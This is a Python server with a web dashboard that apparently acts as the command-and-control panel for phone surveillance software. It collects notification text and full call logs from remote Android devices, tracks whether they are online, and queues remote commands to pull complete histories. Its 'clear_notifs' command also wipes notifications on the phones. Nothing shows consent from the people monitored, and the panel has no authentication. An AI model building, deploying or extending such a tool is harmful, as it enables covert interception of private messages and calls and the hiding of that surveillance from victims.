#!/usr/bin/env python3
"""
Device Monitor - Server Panel
Zero dependency (stdlib only). Python 3.8+

Run:  python server.py  (default port 5000)
     python server.py 8080

Open: http://0.0.0.0:5000  ->  Live dashboard
Data storage: monitor_data.db (SQLite)
API:
  POST /api/notifications   -> single notification JSON
  POST /api/calls           -> {"device_id": ..., "calls": [...]}
  GET  /api/data            -> {"notifications": [...], "calls": [...]}
  GET  /api/status          -> {"devices": [...], "online_count": n, "offline_count": n}
  POST /api/heartbeat       -> device heartbeat (long-poll, pending command return karta hai)
  POST /api/ping            -> {"device": ...} device ko ping, pong ka wait karta hai
  POST /api/pong            -> device ka ping-response
  POST /api/clear           -> wipe stored data
  POST /api/clear_notifs    -> delete stored notifications (optional {"device": id})
"""
import json
import os
import sqlite3
import sys
import threading
import time
import uuid
from datetime import datetime
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlparse, parse_qs

DB_PATH = "monitor_data.db"
_lock = threading.Lock()


def safe_print(msg):
    """Windows cp1252 console par crash-proof print (Hindi/emoji titles)."""
    try:
        print(msg)
    except UnicodeEncodeError:
        try:
            print(msg.encode("ascii", "backslashreplace").decode("ascii"))
        except Exception:
            pass


# ---- Device online/offline + ping state (memory) ----
_status_lock = threading.Lock()
last_seen = {}      # device_id -> time.time() of last heartbeat
device_info = {}    # device_id -> {"brand": ..., "model": ...}
pending_cmds = {}   # device_id -> [ {"cmd": "ping"/"sync_calls", ...}, ... ] FIFO queue
pong_events = {}    # (device_id, cmd_id) -> {"t": time.time(), "device_time": ms}
ONLINE_WINDOW = 30      # 30s tak heartbeat nahi aaya to OFFLINE
PING_TIMEOUT = 10       # ping ke baad pong ka max wait (sec)
HEARTBEAT_WAIT_MAX = 25  # long-poll max hold (sec)

SCHEMA = """
CREATE TABLE IF NOT EXISTS notifications (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id TEXT, package TEXT, title TEXT, text TEXT,
    post_time INTEGER, time_str TEXT,
    received_at TEXT DEFAULT (datetime('now','localtime'))
);
CREATE TABLE IF NOT EXISTS calls (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id TEXT, number TEXT, name TEXT, type TEXT,
    date INTEGER, time_str TEXT, duration_sec INTEGER,
    received_at TEXT DEFAULT (datetime('now','localtime'))
);
"""


def db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn


def init_db():
    with _lock, db() as conn:
        conn.executescript(SCHEMA)
        # Purane duplicates saaf karo (listener reconnect re-POST spam)
        conn.execute(
            "DELETE FROM notifications WHERE id NOT IN "
            "(SELECT MIN(id) FROM notifications GROUP BY device_id, package, title, text, post_time)")
        conn.execute(
            "DELETE FROM calls WHERE id NOT IN "
            "(SELECT MIN(id) FROM calls GROUP BY device_id, date, number, type, duration_sec)")
        for stmt in (
            "CREATE UNIQUE INDEX IF NOT EXISTS idx_notifs_uniq "
            "ON notifications(device_id, package, title, text, post_time)",
            "CREATE UNIQUE INDEX IF NOT EXISTS idx_calls_uniq "
            "ON calls(device_id, date, number, type, duration_sec)"):
            try:
                conn.execute(stmt)
            except sqlite3.OperationalError:
                pass


def save_notification(d):
    with _lock, db() as conn:
        conn.execute(
            "INSERT OR IGNORE INTO notifications (device_id, package, title, text, post_time, time_str) "
            "VALUES (?,?,?,?,?,?)",
            (d.get("device_id"), d.get("package"), d.get("title"),
             d.get("text"), d.get("post_time"), d.get("time_str")))


def save_calls(d):
    rows = d.get("calls", [])
    with _lock, db() as conn:
        for c in rows:
            conn.execute(
                "INSERT OR IGNORE INTO calls (device_id, number, name, type, date, time_str, duration_sec) "
                "VALUES (?,?,?,?,?,?,?)",
                (d.get("device_id") or c.get("device_id"), c.get("number"), c.get("name"),
                 c.get("type"), c.get("date"), c.get("time_str"), c.get("duration_sec")))


def fetch_data(notif_limit=500, call_limit=500, device=None):
    with _lock, db() as conn:
        if device:
            notifs = [dict(r) for r in conn.execute(
                "SELECT * FROM notifications WHERE device_id=? ORDER BY id DESC LIMIT ?",
                (device, notif_limit))]
            calls = [dict(r) for r in conn.execute(
                "SELECT * FROM calls WHERE device_id=? ORDER BY date DESC LIMIT ?",
                (device, call_limit))]
        else:
            notifs = [dict(r) for r in conn.execute(
                "SELECT * FROM notifications ORDER BY id DESC LIMIT ?", (notif_limit,))]
            calls = [dict(r) for r in conn.execute(
                "SELECT * FROM calls ORDER BY date DESC LIMIT ?", (call_limit,))]
    return {"notifications": notifs, "calls": calls}


def fetch_devices():
    # Dedupe: ek device_id sirf ek baar (purane DB me duplicate rows ho sakti hain)
    seen = {}
    with _lock, db() as conn:
        for r in conn.execute(
                "SELECT device_id, COUNT(*) AS calls_count FROM calls GROUP BY device_id"):
            seen[r["device_id"]] = {
                "device_id": r["device_id"],
                "calls_count": r["calls_count"],
                "notifs_count": 0}
        for r in conn.execute(
                "SELECT device_id, COUNT(*) AS notifs_count FROM notifications GROUP BY device_id"):
            d = seen.setdefault(r["device_id"], {
                "device_id": r["device_id"], "calls_count": 0, "notifs_count": 0})
            d["notifs_count"] = r["notifs_count"]
    return list(seen.values())


def is_online(device_id):
    with _status_lock:
        ls = last_seen.get(device_id)
    return ls is not None and (time.time() - ls) < ONLINE_WINDOW


def fetch_status():
    now = time.time()
    with _status_lock:
        seen = dict(last_seen)
    out = []
    known = set()
    with _status_lock:
        info = dict(device_info)
    for d in fetch_devices():
        dev = d["device_id"]
        known.add(dev)
        ls = seen.get(dev)
        di = info.get(dev, {})
        out.append({
            "device_id": dev,
            "brand": di.get("brand", ""),
            "model": di.get("model", ""),
            "device_name": (di.get("brand", "") + " " + di.get("model", "")).strip().upper(),
            "calls_count": d.get("calls_count", 0),
            "notifs_count": d.get("notifs_count", 0),
            "online": ls is not None and (now - ls) < ONLINE_WINDOW,
            "last_seen_sec_ago": int(now - ls) if ls else None,
        })
    for dev, ls in seen.items():
        if dev not in known:
            out.append({
                "device_id": dev, "calls_count": 0, "notifs_count": 0,
                "online": (now - ls) < ONLINE_WINDOW,
                "last_seen_sec_ago": int(now - ls),
            })
    out.sort(key=lambda x: (not x["online"], x["device_id"]))
    return out


DASHBOARD = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Device Monitor Panel</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { font-family: 'Segoe UI', Arial, sans-serif; background: #0f172a; color: #e2e8f0; }
  header { background: #1e293b; padding: 16px 24px; display: flex; justify-content: space-between;
           align-items: center; border-bottom: 2px solid #334155; flex-wrap: wrap; gap: 8px; }
  header h1 { font-size: 20px; color: #38bdf8; }
  .stats { font-size: 13px; color: #94a3b8; }
  .stats b { color: #f8fafc; }
  main { padding: 20px; max-width: 1200px; margin: 0 auto; }
  .tabs { display: flex; gap: 8px; margin-bottom: 16px; flex-wrap: wrap; align-items: center; }
  .tab { padding: 8px 20px; background: #1e293b; border: 1px solid #334155; border-radius: 8px 8px 0 0;
         cursor: pointer; font-size: 14px; }
  .tab.active { background: #38bdf8; color: #0f172a; font-weight: 600; }
  .cards { display: grid; grid-template-columns: repeat(auto-fill, minmax(340px, 1fr)); gap: 12px; }
  .card { background: #1e293b; border: 1px solid #334155; border-radius: 10px; padding: 14px;
          animation: fadeIn .3s; }
  .card.new { border-color: #38bdf8; }
  .card h3 { font-size: 14px; color: #38bdf8; margin-bottom: 6px; word-break: break-all; }
  .card p { font-size: 13px; color: #cbd5e1; word-break: break-word; white-space: pre-wrap; }
  .meta { margin-top: 8px; font-size: 11px; color: #64748b; display: flex; gap: 12px; flex-wrap: wrap; }
  .badge { display: inline-block; padding: 2px 8px; border-radius: 4px; font-size: 11px; font-weight: 600; }
  .INCOMING { background: #064e3b; color: #34d399; }
  .OUTGOING { background: #1e3a8a; color: #93c5fd; }
  .MISSED   { background: #7f1d1d; color: #fca5a5; }
  .REJECTED { background: #78350f; color: #fcd34d; }
  table { width: 100%; border-collapse: collapse; background: #1e293b; border-radius: 10px; overflow: hidden; }
  th, td { padding: 10px 14px; text-align: left; font-size: 13px; border-bottom: 1px solid #334155; }
  th { background: #0f172a; color: #38bdf8; font-weight: 600; }
  tr:hover td { background: #273449; }
  .empty { text-align: center; padding: 40px; color: #475569; }
  @keyframes fadeIn { from { opacity: 0; transform: translateY(-6px);} to { opacity: 1; } }
  .dot { width: 9px; height: 9px; border-radius: 50%; background: #22c55e; display: inline-block;
         animation: pulse 1.5s infinite; }
  @keyframes pulse { 0%,100% {opacity:1} 50% {opacity:.4} }
  button.danger { background: #7f1d1d; color: #fca5a5; border: none; padding: 8px 16px;
                  border-radius: 6px; cursor: pointer; font-size: 13px; }
  button.warn { background: #92400e; color: #fde68a; border: none; padding: 8px 16px;
                border-radius: 6px; cursor: pointer; font-size: 13px; font-weight: 600; }
  button.warn:hover { background: #b45309; }
  select { background: #1e293b; color: #e2e8f0; border: 1px solid #334155; padding: 8px 12px;
           border-radius: 6px; font-size: 13px; cursor: pointer; }
  button.primary { background: #0284c7; color: #e0f2fe; border: none; padding: 8px 18px;
                   border-radius: 6px; cursor: pointer; font-size: 13px; font-weight: 600; }
  button.primary:hover { background: #0369a1; }
  button.ping { background: #166534; color: #bbf7d0; border: none; padding: 8px 18px;
                border-radius: 6px; cursor: pointer; font-size: 13px; font-weight: 600; }
  button.ping:hover { background: #15803d; }
  button.ping:disabled { opacity: .5; cursor: wait; }
  #getStatus { font-size: 12px; color: #38bdf8; margin-left: 10px; }
  #pingResult { margin: 0 0 14px 0; font-size: 13px; padding: 10px 14px; border-radius: 8px;
                background: #1e293b; border: 1px solid #334155; display: none; white-space: pre-wrap; }
  .devOnline { color: #34d399; font-weight: 600; }
  .devOffline { color: #64748b; }
</style>
</head>
<body>
<header>
  <h1><span class="dot"></span> Device Monitor Panel &mdash; LIVE</h1>
  <div class="stats">
    Devices: <b id="stDevices">0</b> &nbsp;|&nbsp;
    <span id="stOnlineWrap">Online: <b id="stOnline" style="color:#22c55e">0</b></span> &nbsp;|&nbsp;
    <span id="stOfflineWrap">Offline: <b id="stOffline" style="color:#f87171">0</b></span> &nbsp;|&nbsp;
    Notifications: <b id="stNotif">0</b> &nbsp;|&nbsp;
    Calls: <b id="stCalls">0</b> &nbsp;|&nbsp;
    Updated: <b id="stTime">-</b>
  </div>
</header>
<main>
  <div id="pingResult"></div>
  <div class="tabs">
    <div class="tab active" id="tabN" onclick="showTab('n')">Notifications</div>
    <div class="tab" id="tabC" onclick="showTab('c')">Call History</div>
    <div style="flex:1"></div>
    <select id="deviceSel">
      <option value="">All Devices</option>
    </select>
    <button class="primary" onclick="getNotifHistory()">Get Notifications</button>
    <button class="primary" onclick="getCallHistory()">Get Call History</button>
    <button class="ping" id="pingBtn" onclick="pingDevice()">Ping Device</button>
    <button class="primary" id="syncBtn" onclick="syncCalls()">Sync Calls</button>
    <span id="getStatus"></span>
    <button class="warn" onclick="clearNotifs()">Delete Notifications</button>
    <button class="danger" onclick="clearData()">Clear Data</button>
  </div>
  <div id="panelN" class="cards"></div>
  <div id="panelC" style="display:none">
      <table><thead><tr><th>Time</th><th>Device</th><th>Number</th><th>Name</th><th>Type</th><th>Duration</th></tr></thead>
      <tbody id="callsBody"></tbody>
    </table>
  </div>
  <div class="empty" id="emptyN">No notifications received yet...</div>
  <div class="empty" id="emptyC" style="display:none">No call entries received yet...</div>
</main>
<script>
let tab = 'n';
let lastNotifId = 0;
let curDev = null;
let fullCalls = null, fullCallsDev = null;
let fullNotifs = null, fullNotifsDev = null;

function showTab(t) {
  tab = t;
  document.getElementById('tabN').classList.toggle('active', t==='n');
  document.getElementById('tabC').classList.toggle('active', t==='c');
  document.getElementById('panelN').style.display = t==='n' ? 'grid' : 'none';
  document.getElementById('panelC').style.display = t==='c' ? 'block' : 'none';
  document.getElementById('emptyN').style.display = (t==='n') ? 'block' : 'none';
  document.getElementById('emptyC').style.display = (t==='c') ? 'block' : 'none';
  // Call history tab khulte hi full history auto-load
  if (t === 'c' && (fullCalls === null || fullCallsDev !== document.getElementById('deviceSel').value)) {
    getCallHistory(true);
  } else {
    refresh(true);
  }
}

function esc(s) { const d = document.createElement('div'); d.textContent = s == null ? '' : s; return d.innerHTML; }

function fmtDur(s) { if (!s) return '0s'; const m = Math.floor(s/60); return m ? m+'m '+(s%60)+'s' : s+'s'; }

function renderCalls(list) {
  document.getElementById('emptyC').style.display = list.length ? 'none' : 'block';
  document.getElementById('callsBody').innerHTML = list.map(c => `
    <tr>
      <td>${esc(c.time_str || c.received_at)}</td>
      <td>${esc(c.device_id)}</td>
      <td>${esc(c.number)}</td>
      <td>${esc(c.name || '-')}</td>
      <td><span class="badge ${esc(c.type)}">${esc(c.type)}</span></td>
      <td>${fmtDur(c.duration_sec)}</td>
    </tr>`).join('');
}

async function refresh(force = false) {
  try {
    const dev = document.getElementById('deviceSel').value;
    if (dev !== curDev) { curDev = dev; lastNotifId = 0; fullCalls = null; fullNotifs = null; }
    const r = await fetch('/api/data?call_limit=2000&notif_limit=300' + (dev ? '&device=' + encodeURIComponent(dev) : ''));
    const data = await r.json();
    const N = data.notifications, C = data.calls;
    if (force) lastNotifId = 0;

    document.getElementById('stNotif').textContent = N.length;
    document.getElementById('stCalls').textContent = C.length;
    document.getElementById('stTime').textContent = new Date().toLocaleTimeString();
    document.getElementById('stDevices').textContent =
      new Set([...N.map(x=>x.device_id), ...C.map(x=>x.device_id)]).size;

    // Notifications - SIRF naye cards prepend karo, pura panel kabhi re-render mat karo
    if (tab === 'n') {
      const panel = document.getElementById('panelN');
      const fullMode = fullNotifs !== null && fullNotifsDev === dev;
      if (fullMode) {
        // Full history loaded hai - sirf naye entries aaye to hi render
        const maxId = fullNotifs.reduce((m, n) => Math.max(m, n.id), 0);
        const fresh = N.filter(n => n.id > maxId);
        if (fresh.length) {
          fullNotifs = [...fresh, ...fullNotifs];
          renderNotifs(fullNotifs);
        }
      } else if (force) {
        // Sirf pehli baar ya force par pura render
        panel.innerHTML = N.map(cardHtml).join('');
        lastNotifId = N.length ? N[0].id : 0;
      } else {
        const fresh = N.filter(n => n.id > lastNotifId);
        if (fresh.length) {
          // Naye cards top par add, purane cards ko touch nahi
          panel.insertAdjacentHTML('afterbegin', fresh.map(n => cardHtml(n, true)).join(''));
          lastNotifId = N[0].id;
        }
      }
      document.getElementById('emptyN').style.display = N.length ? 'none' : 'block';
    }

    // Calls - Call History tab par hamesha latest list render
    if (tab === 'c') {
      if (fullCalls !== null && fullCallsDev === dev && fullCalls.length) {
        const maxId = fullCalls.reduce((m, c) => Math.max(m, c.id), 0);
        const fresh = C.filter(c => c.id > maxId);
        if (fresh.length) fullCalls = [...fresh, ...fullCalls];
        renderCalls(fullCalls);
      } else {
        renderCalls(C);
      }
    }
  } catch (e) { /* server unreachable */ }
}

async function loadDevices() {
  try {
    const r = await fetch('/api/status');
    const data = await r.json();
    const sel = document.getElementById('deviceSel');
    const cur = sel.value;
    const opts = ['<option value="">All Devices</option>'];
    // Client-side dedupe - ek device sirf ek baar
    const dmap = {};
    data.devices.forEach(d => dmap[d.device_id] = d);
    data.devices = Object.values(dmap);
    for (const d of data.devices) {
      const dname = d.device_name ? d.device_name + ' | ' + d.device_id : d.device_id;
      opts.push(`<option value="${esc(d.device_id)}">${esc(dname)} ${d.online ? '&#9679; ONLINE' : '&#9679; OFFLINE'} (${d.calls_count || 0} calls, ${d.notifs_count || 0} notifs)</option>`);
    }
    // Dropdown sirf tab rebuild karo jab options me koi change ho
    const newHtml = opts.join('');
    if (sel.innerHTML !== newHtml) sel.innerHTML = newHtml;
    sel.value = cur;
    if (sel.value !== cur) sel.value = '';
    let online = 0, offline = 0;
    data.devices.forEach(d => d.online ? online++ : offline++);
    document.getElementById('stOnline').textContent = online;
    document.getElementById('stOffline').textContent = offline;
    document.getElementById('stDevices').textContent = data.devices.length;
  } catch (e) {}
}

async function getCallHistory(silent = false) {
  const el = document.getElementById('getStatus');
  try {
    const dev = document.getElementById('deviceSel').value;
    if (!silent) el.textContent = 'Loading...';
    const r = await fetch('/api/calls' + (dev ? '?device=' + encodeURIComponent(dev) : ''));
    const data = await r.json();
    fullCalls = data.calls; fullCallsDev = dev;
    if (tab !== 'c') showTab('c'); else renderCalls(data.calls);
    if (!silent) {
      el.textContent = `${data.count} entries loaded${data.device ? ' [device: ' + data.device + ']' : ''}`;
      setTimeout(() => { if (el.textContent.startsWith(String(data.count))) el.textContent = ''; }, 6000);
    }
  } catch (e) {
    if (!silent) el.textContent = 'Failed to load';
  }
}

function cardHtml(n, isNew = false) {
  return `
    <div class="card ${isNew ? 'new' : ''}">
      <h3>${esc(n.title || n.package)}</h3>
      <p>${esc(n.text)}</p>
      <div class="meta">
        <span>PKG: ${esc(n.package)}</span>
        <span>DEV: ${esc(n.device_id)}</span>
        <span>${esc(n.time_str || n.received_at)}</span>
      </div>
    </div>`;
}

function renderNotifs(list) {
  document.getElementById('emptyN').style.display = list.length ? 'none' : 'block';
  document.getElementById('panelN').innerHTML = list.map(n => `
    <div class="card">
      <h3>${esc(n.title || n.package)}</h3>
      <p>${esc(n.text)}</p>
      <div class="meta">
        <span>PKG: ${esc(n.package)}</span>
        <span>DEV: ${esc(n.device_id)}</span>
        <span>${esc(n.time_str || n.received_at)}</span>
      </div>
    </div>`).join('');
}

async function getNotifHistory() {
  const el = document.getElementById('getStatus');
  const dev = document.getElementById('deviceSel').value;
  try {
    el.textContent = 'Device ko sync command bhej rahe...';
    await fetch('/api/command', {method:'POST', headers:{'Content-Type':'application/json'},
      body: JSON.stringify({device: dev || 'all', cmd: 'sync_notifs'})});
    el.textContent = 'Command gaya - device apni puri notif history bhej raha hai (wait)...';
    await new Promise(r => setTimeout(r, 6000));
    const r = await fetch('/api/notifs' + (dev ? '?device=' + encodeURIComponent(dev) : ''));
    const data = await r.json();
    fullNotifs = data.notifications; fullNotifsDev = dev;
    if (tab !== 'n') showTab('n'); else renderNotifs(data.notifications);
    el.textContent = `${data.count} notifications loaded (purani history + panel wali sab included)`;
    setTimeout(() => { if (el.textContent.includes('loaded')) el.textContent = ''; }, 8000);
  } catch (e) { el.textContent = 'Failed to load notifications'; }
}

async function pingDevice() {
  const btn = document.getElementById('pingDeviceBtn') || document.querySelector('button.ping');
  const el = document.getElementById('getStatus');
  const box = document.getElementById('pingResult');
  const dev = document.getElementById('deviceSel').value;
  try {
    box.style.display = 'block';
    if (dev) {
      box.textContent = `Pinging ${dev}... (device se response ka wait)`;
      const r = await fetch('/api/ping', {method:'POST', headers:{'Content-Type':'application/json'},
        body: JSON.stringify({device: dev})});
      const d = await r.json();
      if (d.status === 'online') {
        box.innerHTML = `<span class="devOnline">&#9679; ${esc(dev)} ONLINE &mdash; device ne response diya (${d.latency_ms} ms)</span>\nDevice time: ${esc(d.device_time_str || '-')}`;
      } else {
        box.innerHTML = `<span style="color:#f87171">&#9679; ${esc(dev)} OFFLINE &mdash; device se koi response nahi aaya</span>`;
      }
    } else {
      box.textContent = 'Ping... (sabhi devices)';
      const st = await (await fetch('/api/status')).json();
      const devs = st.devices.map(d => d.device_id);
      if (!devs.length) { box.innerHTML = '<span class="devOffline">Koi device registered nahi hai</span>'; return; }
      const results = await Promise.all(devs.map(async dv => {
        const r = await fetch('/api/ping', {method:'POST', headers:{'Content-Type':'application/json'},
          body: JSON.stringify({device: dv})});
        const d = await r.json();
        return d.status === 'online'
          ? `<span class="devOnline">&#9679; ${esc(dv)}: ONLINE (${d.latency_ms} ms)</span>`
          : `<span class="devOffline">&#9675; ${esc(dv)}: OFFLINE - no response</span>`;
      }));
      box.innerHTML = results.join('<br>');
    }
  } catch (e) {
    box.style.display = 'block';
    box.innerHTML = '<span style="color:#f87171">Ping failed - server error</span>';
  }
}

async function syncCalls() {
  const el = document.getElementById('getStatus');
  try {
    const dev = document.getElementById('deviceSel').value;
    const r = await fetch('/api/command', {method:'POST', headers:{'Content-Type':'application/json'},
      body: JSON.stringify({device: dev || 'all', cmd: 'sync_calls'})});
    const d = await r.json();
    const who = (dev && dev !== 'all') ? dev : 'sabhi devices';
    el.textContent = `Sync command bhej di -> ${who}: device poori call history abhi bhejega (10-30s me aa jayegi)`;
    setTimeout(() => { if (el.textContent.startsWith('Sync command')) el.textContent = ''; }, 10000);
  } catch (e) { el.textContent = 'Failed to send command'; }
}

async function clearNotifs() {
  if (!confirm('Delete ALL stored notifications? Sirf notifications delete hongi, calls history safe rahegi.\nPhones par bhi purani notifications clear ho jayengi.')) return;
  const el = document.getElementById('getStatus');
  try {
    const dev = document.getElementById('deviceSel').value;
    await fetch('/api/clear_notifs', {method:'POST', headers:{'Content-Type':'application/json'},
      body: JSON.stringify(dev ? {device: dev} : {})});
    await fetch('/api/command', {method:'POST', headers:{'Content-Type':'application/json'},
      body: JSON.stringify({device: dev || 'all', cmd: 'clear_notifs'})});
    el.textContent = 'Notifications deleted (server + phones)';
    setTimeout(() => { if (el.textContent.startsWith('Notifications deleted')) el.textContent = ''; }, 8000);
  } catch (e) { el.textContent = 'Delete failed'; }
  lastNotifId = 0; fullCalls = null; fullNotifs = null;
  refresh(true);
}

async function clearData() {
  if (!confirm('Clear all stored data?')) return;
  await fetch('/api/clear', {method:'POST'});
  lastNotifId = 0; fullCalls = null; fullNotifs = null;
  refresh(true);
}

document.getElementById('deviceSel').addEventListener('change', () => { fullCalls = null; fullNotifs = null; refresh(true); });
showTab('n');
loadDevices();
setInterval(refresh, 2000);
setInterval(loadDevices, 5000);
</script>
</body>
</html>"""


class Handler(BaseHTTPRequestHandler):
    def _json(self, obj, code=200):
        body = json.dumps(obj).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _read_body(self):
        length = int(self.headers.get("Content-Length", 0))
        raw = self.rfile.read(length) if length else b"{}"
        return json.loads(raw.decode("utf-8", "replace"))

    def do_GET(self):
        path = urlparse(self.path).path
        qs = parse_qs(urlparse(self.path).query)
        if path == "/":
            body = DASHBOARD.encode()
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
        elif path == "/api/data":
            device = qs.get("device", [None])[0]
            try:
                nl = int(qs.get("notif_limit", ["500"])[0])
                cl = int(qs.get("call_limit", ["500"])[0])
            except ValueError:
                nl, cl = 500, 500
            self._json(fetch_data(notif_limit=nl, call_limit=cl, device=device))
        elif path == "/api/devices":
            self._json({"devices": fetch_devices()})
        elif path == "/api/status":
            devices = fetch_status()
            online = sum(1 for d in devices if d["online"])
            self._json({"devices": devices,
                        "online_count": online,
                        "offline_count": len(devices) - online,
                        "server_time": time.time()})
        elif path == "/api/calls":
            device = qs.get("device", [None])[0]
            with _lock, db() as conn:
                if device:
                    calls = [dict(r) for r in conn.execute(
                        "SELECT * FROM calls WHERE device_id=? ORDER BY date DESC LIMIT 100000",
                        (device,))]
                else:
                    calls = [dict(r) for r in conn.execute(
                        "SELECT * FROM calls ORDER BY date DESC LIMIT 100000")]
            self._json({"device": device, "count": len(calls), "calls": calls})
        elif path == "/api/notifs":
            device = qs.get("device", [None])[0]
            with _lock, db() as conn:
                if device:
                    notifs = [dict(r) for r in conn.execute(
                        "SELECT * FROM notifications WHERE device_id=? "
                        "ORDER BY post_time DESC LIMIT 100000", (device,))]
                else:
                    notifs = [dict(r) for r in conn.execute(
                        "SELECT * FROM notifications ORDER BY post_time DESC LIMIT 100000")]
            self._json({"device": device, "count": len(notifs), "notifications": notifs})
        else:
            self._json({"error": "not found"}, 404)

    def do_POST(self):
        path = urlparse(self.path).path
        try:
            data = self._read_body()
        except Exception:
            return self._json({"error": "bad json"}, 400)

        if path == "/api/notifications":
            save_notification(data)
            safe_print(f"[+] NOTIF  dev={data.get('device_id')} pkg={data.get('package')} "
                       f"title={data.get('title')!r}")
            self._json({"ok": True})
        elif path == "/api/calls":
            save_calls(data)
            safe_print(f"[+] CALLS  dev={data.get('device_id')} count={len(data.get('calls', []))}")
            self._json({"ok": True})
        elif path == "/api/notifs_batch":
            # Device ki puri notification history batch me aati hai
            rows = data.get("notifs", [])
            for n in rows:
                n.setdefault("device_id", data.get("device_id"))
                save_notification(n)
            safe_print(f"[+] NOTIFS-BATCH dev={data.get('device_id')} count={len(rows)}")
            self._json({"ok": True, "saved": len(rows)})
        elif path == "/api/heartbeat":
            dev = data.get("device_id")
            with _status_lock:
                last_seen[dev] = time.time()
                # Device ka brand/model yaad rakho (vivo/samsung + model no.)
                if data.get("brand") or data.get("model"):
                    device_info[dev] = {
                        "brand": data.get("brand") or "",
                        "model": data.get("model") or "",
                    }
                q = pending_cmds.get(dev)
                cmd = q.pop(0) if q else None
                if q is not None and not q:
                    pending_cmds.pop(dev, None)
            # Pending command uthao; warna wait second tak long-poll karo
            wait = min(int(data.get("wait", 0) or 0), HEARTBEAT_WAIT_MAX)
            deadline = time.time() + wait
            while cmd is None and wait > 0 and time.time() < deadline:
                time.sleep(0.5)
                with _status_lock:
                    last_seen[dev] = time.time()
                    q = pending_cmds.get(dev)
                    cmd = q.pop(0) if q else None
                    if q is not None and not q:
                        pending_cmds.pop(dev, None)
            self._json({"ok": True, "cmd": cmd})
        elif path == "/api/command":
            # Panel se device ko command: {"device": id|"all", "cmd": "sync_calls"|"ping"}
            dev = data.get("device")
            cmd_name = data.get("cmd")
            if not cmd_name:
                return self._json({"error": "no cmd"}, 400)
            if dev and dev != "all":
                with _status_lock:
                    pending_cmds.setdefault(dev, []).append({"cmd": cmd_name, "id": f"{cmd_name}-{time.time()}"})
                sent_to = [dev]
            else:
                with _status_lock:
                    targets = set(list(last_seen.keys()) + [d["device_id"] for d in fetch_devices()])
                for d in targets:
                    with _status_lock:
                        pending_cmds.setdefault(d, []).append({"cmd": cmd_name, "id": f"{cmd_name}-{time.time()}"})
                sent_to = list(targets)
            safe_print(f"[+] CMD {cmd_name} -> {sent_to}")
            self._json({"ok": True, "sent_to": sent_to, "cmd": cmd_name})
        elif path == "/api/pong":
            dev = data.get("device_id")
            cmd_id = data.get("cmd_id")
            with _status_lock:
                pong_events[(dev, cmd_id)] = {
                    "t": time.time(),
                    "device_time": data.get("device_time"),
                }
                last_seen[dev] = time.time()
            safe_print(f"[+] PONG    dev={dev} cmd_id={cmd_id}")
            self._json({"ok": True})
        elif path == "/api/ping":
            dev = data.get("device")
            if not dev:
                return self._json({"status": "offline", "error": "no device given"}, 400)
            cmd_id = f"ping-{time.time()}"
            with _status_lock:
                pending_cmds.setdefault(dev, []).append({"cmd": "ping", "id": cmd_id})
                pong_events.pop((dev, cmd_id), None)
            t0 = time.time()
            deadline = t0 + PING_TIMEOUT
            pong = None
            while time.time() < deadline:
                time.sleep(0.2)
                with _status_lock:
                    pong = pong_events.pop((dev, cmd_id), None)
                if pong:
                    break
            if pong:
                latency_ms = int((pong["t"] - t0) * 1000)
                dt = pong.get("device_time")
                dt_str = datetime.fromtimestamp(dt / 1000).strftime("%Y-%m-%d %H:%M:%S") if dt else "-"
                safe_print(f"[+] PING OK dev={dev} latency={latency_ms}ms")
                self._json({"status": "online", "device": dev,
                            "latency_ms": latency_ms, "device_time": dt,
                            "device_time_str": dt_str})
            else:
                with _status_lock:
                    q = pending_cmds.get(dev)
                    if q:
                        pending_cmds[dev] = [c for c in q
                                             if not (c.get("cmd") == "ping" and c.get("id") == cmd_id)]
                safe_print(f"[+] PING FAIL dev={dev} - no response in {PING_TIMEOUT}s")
                self._json({"status": "offline", "device": dev,
                            "error": f"no response in {PING_TIMEOUT}s"})
        elif path == "/api/clear_notifs":
            dev = (data or {}).get("device")
            with _lock, db() as conn:
                if dev:
                    cur = conn.execute("DELETE FROM notifications WHERE device_id=?", (dev,))
                else:
                    cur = conn.execute("DELETE FROM notifications")
            n = cur.rowcount if cur else 0
            safe_print(f"[+] CLEAR-NOTIFS dev={dev or 'all'} deleted={n}")
            self._json({"ok": True, "deleted": n})
        elif path == "/api/clear":
            with _lock, db() as conn:
                conn.execute("DELETE FROM notifications")
                conn.execute("DELETE FROM calls")
            self._json({"ok": True})
        else:
            self._json({"error": "not found"}, 404)

    def log_message(self, fmt, *args):
        pass  # silence default access log


if __name__ == "__main__":
    # Render.com PORT env var deta hai; local par default 5000
    port = int(sys.argv[1]) if len(sys.argv) > 1 else int(os.environ.get("PORT", 5000))
    # Cloud platforms par 0.0.0.0 bind zaroori hai
    host = "0.0.0.0"
    init_db()
    server = ThreadingHTTPServer(("0.0.0.0", port), Handler)
    print(f"[*] Device Monitor Panel running on http://0.0.0.0:{port}")
    print(f"[*] Dashboard:  http://localhost:{port}")
    print("[*] Data file:  " + DB_PATH)
    print("[*] Press Ctrl+C to stop")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Stopped")
